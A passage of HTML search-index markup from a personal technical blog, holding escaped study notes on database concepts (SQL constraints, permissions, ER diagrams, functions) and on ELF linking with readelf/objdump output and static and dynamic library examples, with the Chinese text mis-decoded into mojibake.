&lt;p&gt;&lt;code&gt;on delete cascade&lt;/code&gt;Â è¡¨ç¤ºçº§è”æ›´æ–°ï¼Œè¿˜å¯ä»¥è®¾ç½® &lt;code&gt;set null&lt;/code&gt;Â ä¸ &lt;code&gt;sel default&lt;/code&gt;Â ç­‰æ“ä½œã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ–­è¨€&#34;&gt;æ–­è¨€&lt;/h3&gt;
&lt;p&gt;æ”¯æŒå¤æ‚çš„çº¦æŸï¼Œå¾ˆå°‘æœ‰æ•°æ®åº“å®ç°ï¼ŒMysqlä¸æ”¯æŒã€‚&lt;/p&gt;
&lt;h2 id=&#34;æƒé™&#34;&gt;æƒé™&lt;/h2&gt;
&lt;p&gt;sqlå…è®¸æˆæƒç»™ç”¨æˆ·æˆ–è§’è‰²ï¼Œå¯ä»¥å¯¹è§†å›¾è¿›è¡Œæˆæƒï¼Œå¯ä»¥æ”¯æŒæƒé™è½¬ç§»ï¼Œä»¥åŠçº§è”æ”¶å›ã€‚&lt;br&gt;
åŸºæœ¬è¯­æ³•&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant &amp;lt;æƒé™åˆ—è¡¨&amp;gt;
on &amp;lt;å…³ç³»åæˆ–è§†å›¾å&amp;gt;
to &amp;lt;ç”¨æˆ·/è§’è‰²åˆ—è¡¨&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ”¶å›æƒé™&lt;br&gt;
revoke on from&lt;/p&gt;
">ã€Šæ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µã€‹--ç¬¬å››ç« </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_uk37gv/"" data-c="
          &lt;h2 id=&#34;å®ä½“é›†&#34;&gt;å®ä½“é›†&lt;/h2&gt;
&lt;h3 id=&#34;å®ä½“&#34;&gt;å®ä½“&lt;/h3&gt;
&lt;p&gt;å®ä½“æŒ‡ç°å®ä¸–ç•Œä¸­å¯ä»¥åŒºåˆ«ä¸å…¶ä»–äº‹åŠ¡æˆ–å¯¹è±¡çš„ä¸€ä¸ªäº‹åŠ¡æˆ–å¯¹è±¡ã€‚ï¼ˆäººã€ä¹¦ã€è¯¾ç¨‹...ï¼‰&lt;/p&gt;
&lt;h3 id=&#34;å®ä½“é›†-2&#34;&gt;å®ä½“é›†&lt;/h3&gt;
&lt;p&gt;å…·æœ‰ç›¸åŒæ€§è´¨çš„ä¸€ç»„å®ä½“çš„é›†åˆã€‚&lt;br&gt;
å®ä½“é›†ä¸å¿…äº’ä¸ç›¸äº¤ã€‚&lt;/p&gt;
&lt;h2 id=&#34;è”ç³»é›†&#34;&gt;è”ç³»é›†&lt;/h2&gt;
&lt;h2 id=&#34;è”ç³»&#34;&gt;è”ç³»&lt;/h2&gt;
&lt;p&gt;è”ç³»æŒ‡å¤šä¸ªå®ä½“ä¹‹é—´çš„ç›¸äº’å…³è”ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å±æ€§&#34;&gt;å±æ€§&lt;/h2&gt;
&lt;p&gt;å®ä½“å…·æœ‰å±æ€§ï¼Œè”ç³»ä¹Ÿå¯ä»¥å…·æœ‰å±æ€§ï¼ˆå­¦ç”Ÿä¸è€å¸ˆé€‰è¯¾å…³ç³»ä¸­çš„dateå°±æ˜¯å…³ç³»çš„å±æ€§ï¼‰ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ç®€å•å±æ€§ä¸å¤æ‚å±æ€§&#34;&gt;ç®€å•å±æ€§ä¸å¤æ‚å±æ€§&lt;/h3&gt;
&lt;p&gt;ç®€å•å±æ€§ä¸å¯å†åˆ†ï¼Œå¤æ‚å±æ€§å¯ä»¥ç»§ç»­åˆ’åˆ†ï¼ˆåå­—åˆ†ä¸ºå§“å’Œåï¼‰ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å•å€¼å±æ€§å’Œå¤šå€¼å±æ€§&#34;&gt;å•å€¼å±æ€§å’Œå¤šå€¼å±æ€§&lt;/h3&gt;
&lt;p&gt;æ¯ä¸ªäººæœ‰ç”µè¯ï¼Œå¯ä»¥æœ‰0ä¸ªæˆ–å¤šä¸ªï¼Œå°±æ˜¯å¤šå€¼å±æ€§ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ´¾ç”Ÿå±æ€§&#34;&gt;æ´¾ç”Ÿå±æ€§&lt;/h3&gt;
&lt;p&gt;å±æ€§ageå¯ä»¥é€šè¿‡å±æ€§birthdayå¾—å‡ºï¼Œageå°±æ˜¯æ´¾ç”Ÿå±æ€§ã€‚&lt;/p&gt;
&lt;h2 id=&#34;çº¦æŸ&#34;&gt;çº¦æŸ&lt;/h2&gt;
&lt;h3 id=&#34;æ˜ å°„åŸºæ•°&#34;&gt;æ˜ å°„åŸºæ•°&lt;/h3&gt;
&lt;p&gt;ä¸€å¯¹ä¸€ã€ä¸€å¯¹å¤šã€å¤šå¯¹ä¸€ã€å¤šå¯¹å¤šã€‚&lt;/p&gt;
&lt;h3 id=&#34;å‚ä¸çº¦æŸ&#34;&gt;å‚ä¸çº¦æŸ&lt;/h3&gt;
&lt;p&gt;å®ä½“é›†Eä¸­çš„æ¯ä¸ªå®ä½“éƒ½å‚ä¸åˆ°è”ç³»é›†Rä¸­çš„è‡³å°‘ä¸€ä¸ªè”ç³»é‡Œé¢ï¼Œé‚£ä¹ˆå°±æ˜¯ &lt;strong&gt;å…¨éƒ¨å‚ä¸&lt;/strong&gt;Â ï¼Œå¦åˆ™æ˜¯ &lt;strong&gt;éƒ¨åˆ†å‚ä¸  ã€‚&lt;/strong&gt;&lt;br&gt;
ï¼ˆæ¯ä¸ªå­¦ç”Ÿéƒ½è¦é€‰è¯¾ï¼Œä¸æ˜¯æ‰€æœ‰è€å¸ˆéƒ½è¦æˆè¯¾ï¼Œå­¦ç”Ÿå°±æ˜¯å…¨éƒ¨å‚ä¸ï¼Œè€å¸ˆæ˜¯éƒ¨åˆ†å‚ä¸ï¼‰&lt;/p&gt;
&lt;h3 id=&#34;é”®çº¦æŸ&#34;&gt;é”®çº¦æŸ&lt;/h3&gt;
&lt;h3 id=&#34;å¼±å®ä½“é›†&#34;&gt;å¼±å®ä½“é›†&lt;/h3&gt;
&lt;p&gt;ä¸»é”®å†—ä½™ï¼Œæ²¡æœ‰è¶³å¤Ÿçš„å±æ€§å½¢æˆä¸»é”®ã€‚&lt;br&gt;
è‹¥å®ä½“é›†å¿…é¡»ä¸å¦ä¸€ä¸ªæ ‡è¯†å®ä½“é›†å…³è”æ‰æœ‰æ„ä¹‰ï¼Œå¼±å®ä½“é›†çš„å­˜åœ¨ä¾èµ–äºæ ‡è¯†å®ä½“é›†ã€‚&lt;/p&gt;
&lt;h2 id=&#34;åˆ é™¤å†—ä½™çº¦æŸ&#34;&gt;åˆ é™¤å†—ä½™çº¦æŸ&lt;/h2&gt;
&lt;p&gt;ã€ã€ã€&lt;/p&gt;
&lt;h2 id=&#34;erå›¾&#34;&gt;ERå›¾&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;çŸ©å½¢ä»£è¡¨å®ä½“é›†ï¼ˆåˆ†æˆåå­—å’Œå±æ€§ï¼‰&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è±å½¢ä»£è¡¨å…³ç³»&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;çº¿æ®µå°†å®ä½“é›†è”ç³»åˆ°è”ç³»é›†&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è™šçº¿è¿æ¥è”ç³»é›†å’Œå…¶å±æ€§&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;åŒçº¿ä»£è¡¨å®ä½“é›†å…¨éƒ¨å‚ä¸&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;åŒè±å‹ä»£è¡¨å¼±å®ä½“è¿æ¥æ ‡å¿—æ€§è”ç³»é›†&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å¸¦ç®­å¤´çš„çº¿ä»£è¡¨ä¸€å‚ä¸ï¼Œä¸å¸¦ç®­å¤´ä»£è¡¨å¤šå‚ä¸&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;**&lt;/p&gt;
&lt;h2 id=&#34;erå›¾è½¬åŒ–ä¸ºå…³ç³»æ¨¡å¼&#34;&gt;ERå›¾è½¬åŒ–ä¸ºå…³ç³»æ¨¡å¼&lt;/h2&gt;
&lt;h3 id=&#34;ç®€å•å±æ€§çš„å¼ºå®ä½“é›†&#34;&gt;ç®€å•å±æ€§çš„å¼ºå®ä½“é›†&lt;/h3&gt;
&lt;p&gt;ç›´æ¥è½¬æ¢ä¸ºå¯¹åº”çš„å…³ç³»æ¨¡å¼ã€‚ï¼ˆä¸»é”®ä¸å˜ï¼‰&lt;/p&gt;
&lt;h3 id=&#34;å¤æ‚å±æ€§çš„å¼ºå®ä½“é›†&#34;&gt;å¤æ‚å±æ€§çš„å¼ºå®ä½“é›†&lt;/h3&gt;
&lt;p&gt;å°†å¤åˆå±æ€§æ›¿æ¢ä¸ºå…¶å­å±æ€§ï¼Œå¯¹äºå¤šå€¼å±æ€§ï¼Œéœ€è¦åˆ›å»ºæ–°çš„å…³ç³»æ¨¡å¼ï¼ˆå±æ€§ä¸ºå®ä½“çš„ä¸»é”®å’Œå¤šå€¼å±æ€§ï¼Œå¹¶ä¸”å…±åŒæ„æˆä¸»é”®ï¼Œä¸”å®ä½“çš„ä¸»é”®ç”Ÿæˆçš„å±æ€§è¦å¤–é”®å‚ç…§æºå®ä½“çš„æ¨¡å¼ï¼‰ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å¼±å®ä½“é›†-2&#34;&gt;å¼±å®ä½“é›†&lt;/h3&gt;
&lt;p&gt;ç”Ÿæˆæ¨¡å¼çš„ä¸»é”®ä¸ºè¯¥å¼±å®ä½“æ‰€ä¾èµ–çš„å¼ºå®ä½“çš„ä¸»é”®ä¸è¯¥å¼±å®ä½“çš„åˆ†è¾¨ç¬¦ç»„åˆè€Œæˆï¼ŒåŒæ—¶è¦åˆ›é€ å¤–é”®çº¦æŸä¸çº§è”åˆ é™¤ã€‚&lt;/p&gt;
&lt;h3 id=&#34;è”ç³»é›†è½¬æ¢ä¸ºå…³ç³»æ¨¡å¼&#34;&gt;è”ç³»é›†è½¬æ¢ä¸ºå…³ç³»æ¨¡å¼&lt;/h3&gt;
&lt;h3 id=&#34;äºŒå…ƒè”ç³»&#34;&gt;äºŒå…ƒè”ç³»&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;å¤šå¯¹å¤šï¼šå‚ä¸çš„ä¸¤ä¸ªå®ä½“é›†çš„ä¸»é”®å…±åŒæ„æˆè”ç³»çš„ä¸»é”®&lt;/li&gt;
&lt;li&gt;ä¸€å¯¹ä¸€ï¼šä»»æ„ä¸€ä¸ªå®ä½“é›†çš„ä¸»é”®å‡å¯æ„æˆè”ç³»é›†çš„å…³ç³»æ¨¡å¼çš„ä¸»é”®&lt;/li&gt;
&lt;li&gt;å¤šå¯¹ä¸€ï¼šâ€œå¤šâ€çš„é‚£ä¸€æ–¹çš„ä¸»é”®æ„æˆè”ç³»é›†çš„å…³ç³»æ¨¡å¼çš„ä¸»é”®&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;æ¨¡å¼å†—ä½™ä¸åˆå¹¶&#34;&gt;æ¨¡å¼å†—ä½™ä¸åˆå¹¶&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;è”ç³»å¼±å®ä½“é›†ä¸å…¶æ‰€ä¾èµ–çš„å¼ºå®ä½“é›†çš„æ¨¡å¼æ˜¯å†—ä½™çš„ï¼Œåœ¨å…³ç³»æ¨¡å¼ä¸­ä¸€èˆ¬ä¸å¿…ç»™å‡º&lt;/li&gt;
&lt;li&gt;å®ä½“é›†Aåˆ°Bæ˜¯ä¸€ä¸ªå¤šå¯¹ä¸€çš„è”ç³»é›†ABï¼Œä¸”Aåœ¨è¯¥è”ç³»ä¸­æ˜¯å…¨éƒ¨å‚ä¸ï¼Œå¯ä»¥æŠŠAå’ŒABæ¨¡å¼åˆå¹¶æˆå•ä¸ªåŒ…å«ä¸¤ä¸ªæ¨¡å¼æ‰€æœ‰å±æ€§çš„å¹¶é›†çš„æ¨¡å¼ï¼Œå…¶ä¸»é”®æ˜¯Açš„ä¸»é”®ï¼ŒABä¸­çš„å¤–é”®çº¦æŸè¦å¸¦åˆ°åˆå¹¶çš„æ¨¡å¼ä¸­&lt;/li&gt;
&lt;li&gt;å¯¹äºä¸€å¯¹ä¸€çš„æƒ…å†µï¼Œè”ç³»é›†çš„å…³ç³»æ¨¡å¼å¯ä»¥ä¸ä»»æ„ä¸€ä¸ªå®ä½“é›†çš„å…³ç³»æ¨¡å¼åˆå¹¶&lt;/li&gt;
&lt;/ul&gt;
">ã€Šæ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µã€‹--ç¬¬ä¸ƒç« </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_gwsquv/"" data-c="
          &lt;h2 id=&#34;å‡½æ•°&#34;&gt;å‡½æ•°&lt;/h2&gt;
&lt;p&gt;Mysqlåˆ›å»ºå‡½æ•°&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;CREATE FUNCTION dept_count (dept_name VARCHAR ( 20 )) 
RETURNS INT ( 11 ) 
BEGIN
	DECLARE
		d_count INT;
	SELECT
		COUNT(*) INTO d_count 
	FROM
		instructor 
	WHERE
		instructor.dept_name = dept_name;
	RETURN d_count;
END
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;SELECT
	dept_name,
	budget ,
	dept_count(dept_name)
FROM
	department 
WHERE
	dept_count ( dept_name ) &amp;gt; 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;sqlæ”¯æŒå‡½æ•°ä¸è¿‡ç¨‹é‡è½½&lt;/p&gt;
&lt;h2 id=&#34;è§¦å‘å™¨&#34;&gt;è§¦å‘å™¨&lt;/h2&gt;
&lt;p&gt;è§¦å‘å™¨æ˜¯ä¸€æ¡è¯­å¥ï¼Œåœ¨å¯¹æ•°æ®åº“åšä¿®æ”¹æ—¶ï¼Œè‡ªåŠ¨è¢«æ‰§è¡Œã€‚&lt;/p&gt;
">ã€Šæ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µã€‹--ç¬¬äº”ç« </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/xdsvqq_nhmggu/"" data-c="
          &lt;h2 id=&#34;å…¸å‹çš„elfå¯é‡å®šä½æ–‡ä»¶æ ¼å¼&#34;&gt;å…¸å‹çš„ELFå¯é‡å®šä½æ–‡ä»¶æ ¼å¼&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/image_922e4d911e04d440260a5a6aec4c5280.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¤ºä¾‹ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* main.c */
int sum(int *a, int n);
int array[2] = {1, 2};

int main()
{
    int value = sum(array, 2);
    return value;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* sum.c */
int sum(int *a,int n){
    int i, sum = 0;
    for (i = 0; i &amp;lt; n; ++i)
    {
        sum += a[i];
    }
    return sum;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ç¬¦å·è¡¨&#34;&gt;ç¬¦å·è¡¨&lt;/h3&gt;
&lt;p&gt;ç¼–è¯‘æˆelfå¯é‡å®šä½æ–‡ä»¶åï¼Œä½¿ç”¨ &lt;code&gt;readelf -all main.o&lt;/code&gt;Â æ‰“å°å‡ºå¦‚ä¸‹ä¿¡æ¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2&#39;s complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              REL (Relocatable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x0
  Start of program headers:          0 (bytes into file)
  Start of section headers:          720 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           0 (bytes)
  Number of program headers:         0
  Size of section headers:           64 (bytes)
  Number of section headers:         12
  Section header string table index: 11

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .text             PROGBITS         0000000000000000  00000040
       0000000000000021  0000000000000000  AX       0     0     1
  [ 2] .rela.text        RELA             0000000000000000  00000228
       0000000000000030  0000000000000018   I       9     1     8
  [ 3] .data             PROGBITS         0000000000000000  00000068
       0000000000000008  0000000000000000  WA       0     0     8
  [ 4] .bss              NOBITS           0000000000000000  00000070
       0000000000000000  0000000000000000  WA       0     0     1
  [ 5] .comment          PROGBITS         0000000000000000  00000070
       000000000000002a  0000000000000001  MS       0     0     1
  [ 6] .note.GNU-stack   PROGBITS         0000000000000000  0000009a
       0000000000000000  0000000000000000           0     0     1
  [ 7] .eh_frame         PROGBITS         0000000000000000  000000a0
       0000000000000038  0000000000000000   A       0     0     8
  [ 8] .rela.eh_frame    RELA             0000000000000000  00000258
       0000000000000018  0000000000000018   I       9     7     8
  [ 9] .symtab           SYMTAB           0000000000000000  000000d8
       0000000000000120  0000000000000018          10     8     8
  [10] .strtab           STRTAB           0000000000000000  000001f8
       000000000000002d  0000000000000000           0     0     1
  [11] .shstrtab         STRTAB           0000000000000000  00000270
       0000000000000059  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)

There are no section groups in this file.

There are no program headers in this file.

There is no dynamic section in this file.

Relocation section &#39;.rela.text&#39; at offset 0x228 contains 2 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000000010  000800000002 R_X86_64_PC32     0000000000000000 array - 4
000000000015  000b00000004 R_X86_64_PLT32    0000000000000000 sum - 4

Relocation section &#39;.rela.eh_frame&#39; at offset 0x258 contains 1 entry:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000000020  000200000002 R_X86_64_PC32     0000000000000000 .text + 0

The decoding of unwind sections for machine type Advanced Micro Devices X86-64 is not currently supported.

Symbol table &#39;.symtab&#39; contains 12 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS main.c
     2: 0000000000000000     0 SECTION LOCAL  DEFAULT    1 
     3: 0000000000000000     0 SECTION LOCAL  DEFAULT    3 
     4: 0000000000000000     0 SECTION LOCAL  DEFAULT    4 
     5: 0000000000000000     0 SECTION LOCAL  DEFAULT    6 
     6: 0000000000000000     0 SECTION LOCAL  DEFAULT    7 
     7: 0000000000000000     0 SECTION LOCAL  DEFAULT    5 
     8: 0000000000000000     8 OBJECT  GLOBAL DEFAULT    3 array
     9: 0000000000000000    33 FUNC    GLOBAL DEFAULT    1 main
    10: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND _GLOBAL_OFFSET_TABLE_
    11: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND sum

No version information found in this file.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é‡ç‚¹å…³æ³¨ç¬¦å·è¡¨çš„æœ€å4è¡Œï¼Œè¡¨ç¤ºmainæ˜¯ä¸€ä¸ª.textèŠ‚ï¼ˆç”±Ndx=1ä»£è¡¨textèŠ‚ï¼‰ä¸­åç§»é‡ä¸º0çš„å¤§å°ä¸º33å­—èŠ‚çš„å‡½æ•°ï¼Œarrayä¸ºä¸€ä¸ª.dataèŠ‚ï¼ˆç”±Ndx=3ä»£è¡¨dataèŠ‚ï¼‰ä¸­åç§»é‡ä¸º0çš„å¤§å°ä¸º8å­—èŠ‚çš„å¯¹è±¡ï¼Œsumæ˜¯ä¸€ä¸ªå¯¹å¤–éƒ¨ç¬¦å·çš„å¼•ç”¨ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ç¬¦å·è§£æ&#34;&gt;ç¬¦å·è§£æ&lt;/h3&gt;
&lt;p&gt;ï¼ˆc++ä¸­çš„ç¬¦å·é‡æ•´ï¼‰&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_baac9c3b12c549bdd12f03b6138e48f0.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;å¼ºç¬¦å·ä¸å¼±ç¬¦å·&#34;&gt;å¼ºç¬¦å·ä¸å¼±ç¬¦å·&lt;/h4&gt;
&lt;p&gt;å¼ºç¬¦å·ï¼š å‡½æ•°ä¸å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡&lt;br&gt;
å¼±ç¬¦å·ï¼š æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡&lt;br&gt;
Linuxå¤„ç†è§„åˆ™&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_6e78315541fc2ce4804706648472d98b.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;code&gt;objdump -dx main.o&lt;/code&gt;Â å¾—åˆ°ä»¥ä¸‹è¾“å‡º&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000000000 &amp;lt;main&amp;gt;:
   0:   55                      push   %rbp
   1:   48 89 e5                mov    %rsp,%rbp
   4:   48 83 ec 10             sub    $0x10,%rsp
   8:   be 02 00 00 00          mov    $0x2,%esi
   d:   48 8d 3d 00 00 00 00    lea    0x0(%rip),%rdi        # 14 &amp;lt;main+0x14&amp;gt;
                        10: R_X86_64_PC32       array-0x4
  14:   e8 00 00 00 00          callq  19 &amp;lt;main+0x19&amp;gt;
                        15: R_X86_64_PLT32      sum-0x4
  19:   89 45 fc                mov    %eax,-0x4(%rbp)
  1c:   8b 45 fc                mov    -0x4(%rbp),%eax
  1f:   c9                      leaveq 
  20:   c3                      retq  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…¶ä¸­ç¬¬6ã€7è¡Œæ˜¯å¯¹arrayçš„é‡å®šä½æ¡ç›®ï¼Œ8ã€9è¡Œæ˜¯å¯¹sumçš„é‡å®šä½æ¡ç›®ã€‚&lt;/p&gt;
&lt;h2 id=&#34;åˆ›å»ºé™æ€åº“&#34;&gt;åˆ›å»ºé™æ€åº“&lt;/h2&gt;
&lt;p&gt;ä»£ç éƒ¨åˆ†&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* multvec.c */
/* $begin multvec */
int multcnt = 0;

void multvec(int *x, int *y,
             int *z, int n)
{
    int i;

    multcnt++;

    for (i = 0; i &amp;lt; n; i++)
        z[i] = x[i] * y[i];
}
/* $end multvec */
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* addvec.c */
/* $begin addvec */
int addcnt = 0;

void addvec(int *x, int *y,
            int *z, int n)
{
    int i;

    addcnt++;

    for (i = 0; i &amp;lt; n; i++)
        z[i] = x[i] + y[i];
}
/* $end addvec */
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* main.c */
/* $begin main */
#include &amp;lt;stdio.h&amp;gt;
#include &amp;quot;vector.h&amp;quot;

int x[2] = {1, 2};
int y[2] = {3, 4};
int z[2];

int main()
{
    addvec(x, y, z, 2);
    printf(&amp;quot;z = [%d %d]\n&amp;quot;, z[0], z[1]);
    return 0;
}
/* $end main2 */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ©ç”¨ARå·¥å…·åˆ›å»ºé™æ€åº“&lt;br&gt;
&lt;code&gt;gcc -c multvec.c addvec.c&lt;/code&gt;Â &lt;br&gt;
&lt;code&gt;ar rcs libvector.a addvec.o multvec.o&lt;/code&gt;Â &lt;br&gt;
ä½¿ç”¨ï¼š &lt;code&gt;gcc -o prog1 main.c -L. -lvector&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;åˆ›å»ºåŠ¨æ€åº“&#34;&gt;åˆ›å»ºåŠ¨æ€åº“&lt;/h2&gt;
&lt;p&gt;å‘½ä»¤ &lt;code&gt;gcc -shared -fpic -o libvector.so addvec.c multvec.c&lt;/code&gt;Â &lt;br&gt;
å…¶ä¸­-fpicç”¨äºç”Ÿæˆä¸ä½ç½®æ— å…³çš„ä»£ç ï¼Œ-sharedæŒ‡ç¤ºé“¾æ¥å™¨åˆ›é€ ä¸€ä¸ªå…±äº«çš„ç›®æ ‡æ–‡ä»¶ã€‚&lt;br&gt;
ä½¿ç”¨ï¼š &lt;code&gt;gcc -o prog2 main.c -L. -lvector&lt;/code&gt;Â &lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_fa745aaf6b4ff0564c2933a309ed29fc.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¯ä»¥çœ‹å‡ºåŠ¨æ€é“¾æ¥æ¯”é™æ€é“¾æ¥äº§ç”Ÿçš„ä»£ç ä½“ç§¯å°&lt;/p&gt;
&lt;h2 id=&#34;linuxè¿è¡Œæ—¶åŠ è½½åŠ¨æ€åº“&#34;&gt;Linuxè¿è¡Œæ—¶åŠ è½½åŠ¨æ€åº“&lt;/h2&gt;
&lt;p&gt;ä¸»è¦åŒ…æ‹¬å‡½æ•° &lt;code&gt;dlopen&lt;/code&gt;Â &lt;code&gt;dlsym&lt;/code&gt;Â &lt;code&gt;dlclose&lt;/code&gt;Â ä¸Â· &lt;code&gt;dlerror&lt;/code&gt;Â &lt;br&gt;
ç¤ºä¾‹ï¼ˆæ¥è‡ªCSAPPç¬¬ä¸ƒç« 7.11ï¼‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* $begin dll */
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;dlfcn.h&amp;gt;

int x[2] = {1, 2};
int y[2] = {3, 4};
int z[2];

int main() 
{
    void *handle;
    void (*addvec)(int *, int *, int *, int);
    char *error; 

    /* Dynamically load the shared library that contains addvec() */
    handle = dlopen(&amp;quot;./libvector.so&amp;quot;, RTLD_LAZY);
    if (!handle) {
	fprintf(stderr, &amp;quot;%s\n&amp;quot;, dlerror());
	exit(1);
    }

    /* Get a pointer to the addvec() function we just loaded */
    addvec = dlsym(handle, &amp;quot;addvec&amp;quot;);
    if ((error = dlerror()) != NULL) {
	fprintf(stderr, &amp;quot;%s\n&amp;quot;, error);
	exit(1);
    }

    /* Now we can call addvec() just like any other function */
    addvec(x, y, z, 2);
    printf(&amp;quot;z = [%d %d]\n&amp;quot;, z[0], z[1]);

    /* Unload the shared library */
    if (dlclose(handle) &amp;lt; 0) {
	fprintf(stderr, &amp;quot;%s\n&amp;quot;, dlerror());
	exit(1);
    }
    return 0;
}
/* $end dll */
&lt;/code&gt;&lt;/pre&gt;
">é“¾æ¥</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_ftoxv1/"" data-c="
          &lt;h2 id=&#34;dmlä¸ddl&#34;&gt;DMLä¸DDL&lt;/h2&gt;
&lt;p&gt;ddlç”¨äºå®šä¹‰æ•°æ®åº“ï¼ŒåŒ…æ‹¬æ•°æ®ç±»å‹ã€æ–­è¨€ã€æƒé™ç­‰ä¸€è‡´æ€§çº¦æŸã€‚ddlç”Ÿæˆæ•°æ®å­—å…¸ï¼ŒåŒ…å«å…ƒæ•°æ®ï¼Œå³æ•°æ®çš„æ•°æ®ã€‚è¿™æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ•°æ®è¡¨ï¼Œåœ¨è¯»å–ä¸ä¿®æ”¹å®é™…æ•°æ®å‰ï¼Œæ•°æ®åº“ä¼šå…ˆå‚è€ƒæ•°æ®å­—å…¸ã€‚&lt;br&gt;
dmlç”¨äºæ“ä½œæ•°æ®åº“ï¼Œå¹¿ä¹‰ä¸Šå°†æŸ¥è¯¢è¯­è¨€ä¸dmlè§†ä¸ºåŒä¹‰è¯ã€‚&lt;/p&gt;
&lt;h2 id=&#34;äº‹åŠ¡çš„å››å¤§ç‰¹æ€§&#34;&gt;äº‹åŠ¡çš„å››å¤§ç‰¹æ€§&lt;/h2&gt;
&lt;h3 id=&#34;ä¸€-åŸå­æ€§atomicity&#34;&gt;ä¸€ã€åŸå­æ€§ï¼ˆatomicity)&lt;/h3&gt;
